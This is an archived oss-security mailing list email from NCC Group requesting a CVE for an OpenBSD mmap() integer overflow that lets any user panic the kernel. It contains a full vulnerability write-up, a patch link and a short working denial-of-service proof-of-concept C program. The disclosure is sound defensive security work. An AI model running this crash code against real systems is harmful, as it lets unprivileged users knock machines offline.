X-VM-v5-Data: ([nil t nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil]
	["6141" "Tuesday" "2" "August" "2016" "13:44:20" "-0400" "Jesse Hertz" "jesse.hertz@nccgroup.trust" "<D777B0B9-DB4B-40FD-A5CC-5757458A9B54@nccgroup.trust>" "169" "[oss-security] CVE Request: Denial-of-Service / Unexploitable Memory Corruption in mmap() on OpenBSD" nil nil nil "8" "2016080217:44:20" "[oss-security] CVE Request: Denial-of-Service / Unexploitable Memory Corruption in mmap() on OpenBSD" (number mark "U       jesse.hertz@ Aug  2  169/6141  " thread-indent "\"[oss-security] CVE Request: Denial-of-Service / Unexploitable Memory Corruption in mmap() on OpenBSD\"\n") nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil]
	nil)
X-Mozilla-Status: 0000
X-Mozilla-Status2: 00000000
Received: (qmail 3493 invoked by uid 550); 2 Aug 2016 17:44:40 -0000
Mailing-List: contact oss-security-help@lists.openwall.com; run by ezmlm
Precedence: bulk
List-Post: <mailto:oss-security@lists.openwall.com>
List-Help: <mailto:oss-security-help@lists.openwall.com>
List-Unsubscribe: <mailto:oss-security-unsubscribe@lists.openwall.com>
List-Subscribe: <mailto:oss-security-subscribe@lists.openwall.com>
List-ID: <oss-security.lists.openwall.com>
Reply-To: oss-security@lists.openwall.com
Received: (qmail 3465 invoked from network); 2 Aug 2016 17:44:39 -0000
DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed; d=nccgroup.trust; s=dkim20160329; t=1470159867; bh=LYnIWTLmhR55ZeDDuHFOmZwMYmZ4iaEcHkdFOsrEpEU=; h=From:Content-Type:Subject:Date:Message-ID:CC:To:MIME-Version; b=KF2qijiDHciQrTWUMT0/oOMtVHWEChTdYOHdzqX5Mi9Fh5lUfRNxCBMsugg0Mj9PKccHmzM8ig6fvbJmTFuogFy6hagzeB+TmCyCs7XMfxvjEsbAnRCzCFiYWUl7J+2LMAmmC5gCynjgZTUXcfuExhQ3iFMsTlM5QeRrlnGV22U=
X-MC-Unique: bcg2_NgKN2a4F1BUQQLl8A-1
X-PGP-Universal: processed;
	by man1srvpgp01p.nccgroup.local on Tue, 02 Aug 2016 18:44:23 +0100
From: Jesse Hertz <jesse.hertz@nccgroup.trust>
X-Pgp-Agent: GPGMail
Content-Type: multipart/signed;
	boundary="Apple-Mail=_8AA92ECD-A256-421D-A2E3-30D486A79026";
	protocol="application/pgp-signature"; micalg=pgp-sha512
Date: Tue, 2 Aug 2016 13:44:20 -0400
Message-ID: <D777B0B9-DB4B-40FD-A5CC-5757458A9B54@nccgroup.trust>
CC: <cve-assign@mitre.org>, Tim Newsham <Tim.Newsham@nccgroup.trust>
To: <oss-security@lists.openwall.com>
MIME-Version: 1.0 (Mac OS X Mail 8.2 \(2104\))
X-Mailer: Apple Mail (2.2104)
X-Originating-IP: [172.20.1.120]
X-ClientProxiedBy: MANCASEXCH02.nccgroup.local (10.1.120.102) To
 MANDBSEXCH03.nccgroup.local (10.1.120.104)
signature: OK
Subject: [oss-security] CVE Request: Denial-of-Service / Unexploitable Memory Corruption in mmap() on OpenBSD

--Apple-Mail=_8AA92ECD-A256-421D-A2E3-30D486A79026
Content-Transfer-Encoding: quoted-printable
Content-Type: text/plain;
	charset=utf-8

Hi All,

As part of NCC Group=E2=80=99s Project Triforce, a generic syscall fuzzing =
effort by
myself and Tim Newsham, a new vulnerability was discovered in the
OpenBSD kernel. It has been fixed now. Please assign a CVE for this issue.

/*
 * mmap_dup_panic.c
 *    Demonstrate a panic through the mmap system call.
 *
 * gcc -g mmap_dup_panic.c -o mmap_dup_panic
 */

#ifdef BUG_WRITEUP //---------------------------------------------------
Any user can trigger a panic in mmap with an overlapping mapping

Impact:
Any user can trigger a panic by requesting a large mapping
that overlaps with an existing mapping.

Risk: Medium (if someone can figure out a way to exploit this for more than=
 a DoS, then this risk rating should be elevated).

Description:
It is possible for an mmap() call to request a mapping at a
virtual address that overlaps an existing mapping.  This is checked
for in uvm_map() by calling uvm_map_isavail() with the hint address and
size..  There is a flaw in uvm_map_isavail() when the requested size is very
large. The code looks up the maps at the start and end address with:

    if (*start_ptr =3D=3D NULL) {
        *start_ptr =3D uvm_map_entrybyaddr(atree, addr);
        if (*start_ptr =3D=3D NULL)
            return 0;
    } else
        KASSERT(*start_ptr =3D=3D uvm_map_entrybyaddr(atree, addr));
    if (*end_ptr =3D=3D NULL) {
        if (VMMAP_FREE_END(*start_ptr) >=3D addr + sz)
            *end_ptr =3D *start_ptr;
        else {
            *end_ptr =3D uvm_map_entrybyaddr(atree, addr + sz - 1);
            if (*end_ptr =3D=3D NULL)
                return 0;
        }
    } else
        KASSERT(*end_ptr =3D=3D uvm_map_entrybyaddr(atree, addr + sz - 1));

Due to an integer overflow that can occur when computing
"addr + sz" it is possible for the end_ptr map to be
computed incorrectly (setting "*end_ptr =3D *start_ptr"). Later
when this same function iterates over the maps between the start
and end maps, the function may fail to notice that a large mapping
overlaps with an existing mapping.

If uvm_map_isavail() indicates that the hint address is available,
uvm_map() will continue its processing without assigning a new
address.  It will eventually call uvm_map_fix_space() which
performs its own sanity lookup with uvm_mapent_addr_insert(),
and panics if an overlapping mapping is added:

    res =3D RB_INSERT(uvm_map_addr, &map->addr, entry);
    if (res !=3D NULL) {
        panic("uvm_mapent_addr_insert: map %p entry %p "
            "(0x%lx-0x%lx G=3D0x%lx F=3D0x%lx) insert collision "
            "with entry %p (0x%lx-0x%lx G=3D0x%lx F=3D0x%lx)",
            map, entry,
            entry->start, entry->end, entry->guard, entry->fspace,
            res, res->start, res->end, res->guard, res->fspace);
    }

An attacker can take advantage of this to intentionally
trigger a panic to crash the system.  This does not require
any special privileges.

In theory this flaw might allow an attacker to make a mapping
that wraps around from user addresses, through kernel addresses
and back to low user addresses.  Such a mapping might allow
access to kernel memory or to the NULL page (useful for performing
certain attacks against NULL pointer use in the kernel).
However neither Tim nor myself were able to find any way to create such a m=
apping
without causing a panic, since it does not appear to be possible
to make a mapping above the stack segment.  All wrap-around mappings
lower than this address overlap with the stack segment and result
in a panic.

Reproduction:
Run the mmap_dup_panic.c program. It first maps a
page in and then performs a second mmap() call to request
another mapping at the next page address.  This second mapping overlaps
the first due to the large size, and causes a panic message such as
"panic: uvm_mapent_addr_insert: map 0xffffff00036be300 entry 0xffffff000311=
d178 (0x1dcc56000000-0x1dcc56000000 G=3D0x0 F=3D0x200000000) insert collisi=
on with entry 0xffffff000272de08 (0x1dcc56000000-0x1dcc56000000 G=3D0x0 F=
=3D0x1000)=E2=80=9D

NCC Group was able to reproduce this issue on OpenBSD 5.9-stable kernel
pulled from CVS on July 25, 2016.

Recommendation:
Detect when "addr + sz" causes an integer overflow in uvm_map_isavail().
Return zero indicating that this mapping is not available in this case.

Reported: 2016-07-28
Fixed:    http://ftp.openbsd.org/pub/OpenBSD/patches/5.9/common/023_uvmisav=
ail.patch.sig
CVE Assigned: TBD
#endif // BUG_WRITEUP ---------------------------------------------------

#include <stdio.h>
#include <stdlib.h>
#include <fcntl.h>
#include <unistd.h>
#include <sys/mman.h>

void xperror(int cond, char *msg)
{
    if(cond) {
        perror(msg);
        exit(1);
    }
}

int main(int argc, char **argv)
{
    int fd;
    char *p, *pg;

    fd =3D open("/tmp/mapfile", O_RDWR|O_CREAT, 0666);
    xperror(fd =3D=3D -1, "/tmp/mapfile");
    write(fd, "testing\n", 8);

    pg =3D mmap(NULL, 4096, PROT_READ | PROT_WRITE, MAP_PRIVATE | MAP_ANONY=
MOUS, -1, 0);
    xperror(pg =3D=3D MAP_FAILED, "mmap");

    p =3D mmap(pg+4096, 0xffffff0000000000, 0, 0, fd, 0);
    xperror(pg =3D=3D MAP_FAILED, "mmap2");
    printf("no crash!\n");
    return 0;
}


--Apple-Mail=_8AA92ECD-A256-421D-A2E3-30D486A79026
Content-Transfer-Encoding: 7bit
Content-Disposition: attachment; filename="signature.asc"
Content-Type: application/pgp-signature; name="signature.asc"
Content-Description: Message signed with OpenPGP using GPGMail

-----BEGIN PGP SIGNATURE-----
Comment: GPGTools - https://gpgtools.org

iQEcBAEBCgAGBQJXoNv0AAoJEPhkPVYKhDWbqOsH/2S6s83WhqZDLJMgskUl4BFV
JbnQk2Lyw0GOUtjiF0R48T9Ndr35ROWptLup5VSDuWpRpJrAXeXd1vfO1siqSZNn
qRkpW6IByqVljyTjt2c7ULzJXSxarKFwycD6VfJ4vVArINYzAxpq17g0eFBxTKzl
1ZAQ0GZSHUwqwbP9G3FsoFenkgJH4O+4bbLRAZ1pQ32EArmk2FKjL3naxKLMo3ck
/S2NtgDYddPdeHMxizeRuGxfISs6WmxRYoZDw0vObY7DAA4nV3f8k9vM3BgF8ty+
mMKK1YDzPFaEvWYsjgsfolAcIwBpAW0JAQZqE7T1SM0O5bdzMMr6tac747d1OF0=
=k8If
-----END PGP SIGNATURE-----

--Apple-Mail=_8AA92ECD-A256-421D-A2E3-30D486A79026--

